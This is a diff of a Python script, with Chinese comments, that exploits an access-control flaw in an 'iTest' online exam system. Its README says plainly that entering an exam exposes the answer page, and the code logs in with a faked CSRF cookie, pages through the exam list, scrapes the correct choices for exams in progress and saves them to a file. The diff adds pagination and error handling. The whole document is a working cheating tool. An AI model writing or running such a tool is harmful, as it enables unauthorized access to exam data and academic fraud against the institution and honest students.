@@ -37,7 +37,6 @@ headers = {
     'POST':'/itest/itest/login HTTP/1.1',
     'Host': HOST,
     'Connection': 'keep-alive',
-    'Content-Length': '97',
     'Accept': 'application/json, text/javascript, */*; q=0.01',
     'X-Requested-With': 'XMLHttpRequest',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.58',
@@ -49,34 +48,62 @@ headers = {
     'Cookie': 'csrf=fakelogin;'
 }
 
+repheaders = {
+    'Host': '172.16.64.208',
+    'Proxy-Connection': 'keep-alive',
+    #Content-Length: 27
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'Origin': 'http://172.16.64.208',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Referer': 'http://172.16.64.208/itest/itest/s/exam/clazz',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5'
+}
+
+curPG = 1
+pagedata = {
+    'keyword': '',
+    'finish': '2',
+    'curPage': curPG
+}
+
 # 说明信息
 README = '''
     软件使用步骤在此
     众所周知，当你考完试的时候，就可以查看答案了
     但是有大佬发现，不一定非得考完试才能查看答案
-    只要你进入考试了，答案就可以查看了
-    其他情况下答案是不允许查看的。
+    有的考试只要你进入考试了，答案就可以查看了
+    有的考试设置了延迟答案，不可查看
     利用这个漏洞，我们可以在开始考试时直接看到答案，从而勉强拿到100分
     '''
 print(README)
 
 # 该函数读取答案页面，提取其中的信息，并保存到字符串中返回
 def show_answer(exam_id: str) -> str:
-    result = '\n'
-    url = 'http://' + HOST + '/itest/itest/biz/exam/papershow/showPaper?clsEpId=' + exam_id
-    page = ss.get(url)
-    bs = BeautifulSoup(page.text, 'lxml')
-    a_tag = bs.find_all('div', style="clear:both;")
-    cnt = 1
-    for each in a_tag:
-        t_tag = each.find_all(style="color:red;")
-        for item in t_tag:
-            if item:
-                choice = str(item.string)
-                result += f'题目: {cnt:2}, {choice}\n'
-                cnt += 1
-    result += '---------------------------------------\n'
-    return result
+    try:
+        result = '\n'
+        url = 'http://' + HOST + '/itest/itest/biz/exam/papershow/showPaper?clsEpId=' + exam_id
+        page = ss.get(url)
+        bs = BeautifulSoup(page.text, 'lxml')
+        a_tag = bs.find_all('div', style="clear:both;")
+        cnt = 1
+        for each in a_tag:
+            t_tag = each.find_all(style="color:red;")
+            for item in t_tag:
+                if item:
+                    choice = str(item.string)
+                    result += f'题目: {cnt:2}, {choice}\n'
+                    if cnt % 5 == 0:
+                        print('')
+                    cnt += 1
+        result += '---------------------------------------\n'
+        return result
+    except:
+        print('答案限时开放，无法查看.')
+        return '!'
     
 # 建立一个session
 ss = requests.session()
@@ -115,15 +142,22 @@ if resJ['code'] == 9 or resJ['code'] == 10:
     os.system("pause")
     os._exit(0)
 
-# 获取当前的测试列表
-res_class = ss.get(classurl)
+lst = []
+while True:
 
-# 使用soup解析网页
-bs = BeautifulSoup(res_class.text, 'lxml')
+    # 获取当前的测试列表
+    res_class = ss.post(classurl, data=pagedata, headers=repheaders)
 
-# 提取h2标签
-lst = bs.find_all('h2')
+    # 使用soup解析网页
+    bs = BeautifulSoup(res_class.text, 'lxml')
 
+    # 提取h2标签
+    cur = bs.find_all('h2')
+    if not cur:
+        break
+    lst += cur
+    curPG += 1
+    pagedata['curPage'] = str(curPG)
 
 print('当前任务: \n')
 
@@ -141,6 +175,12 @@ for each in lst:
     par = each.parent
     dd = par.find_all('dd')
     a = par.find_all('a')
+    if not a:
+        print(f'序号{no}任务: {each.string}: [缺考]')
+        print('-------------------')
+        no += 1
+        continue
+    
     astr = str(a[0].string)
     name = str(each.string)
 
@@ -178,6 +218,8 @@ for each in tasklist:
         print(f'*** 发现正在进行的考试 {each[3]} ID: {each[0]}, 答案如下: ***')
         exam_cnt += 1
         data = show_answer(each[0])
+        if data == '!':
+            continue
         ans_file.write(each[3])
         ans_file.write(data)
         print(data)
@@ -185,20 +227,18 @@ for each in tasklist:
         continue
 
 if exam_cnt == 0:
-    print('没有正在进行的考试. 默认显示所有可查看单元.')
-    for each in tasklist:
-        if each[1] == True and each[2] == False:
-            print(each[3])
-            data = show_answer(each[0])
-            ans_file.write(each[3])
-            ans_file.write(data)
-            print(data)
+    print('没有正在进行的考试.')
+    # for each in tasklist:
+    #     if each[1] == True and each[2] == False:
+    #         print(each[3])
+    #         data = show_answer(each[0])
+    #         ans_file.write(each[3])
+    #         ans_file.write(data)
+    #         print(data)
 
 # 版权（笑）信息
-ans_file.write('\n__Marvels_你好__\n')
+ans_file.write('\n__Marvels_你好__@19003010的大笨B\n')
 ans_file.close()
 
 print('以上内容已被保存到当前目录下"答案.txt"')
 os.system('pause')
-
-
